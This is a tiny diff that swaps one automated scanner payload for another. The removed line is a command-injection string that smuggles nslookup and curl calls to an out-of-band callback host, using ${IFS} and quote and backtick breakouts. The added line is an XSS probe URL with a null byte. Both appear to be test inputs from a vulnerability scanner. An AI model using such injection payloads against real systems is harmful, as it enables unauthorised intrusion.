@@ -1,1 +1,1 @@
-&(nslookup${IFS}-q${IFS}cname${IFS}hitocyhbgwhgff63df.bxss.me||curl${IFS}hitocyhbgwhgff63df.bxss.me)&'\"`0&(nslookup${IFS}-q${IFS}cname${IFS}hitocyhbgwhgff63df.bxss.me||curl${IFS}hitocyhbgwhgff63df.bxss.me)&`'
+bxss.me/t/xss.html?%00
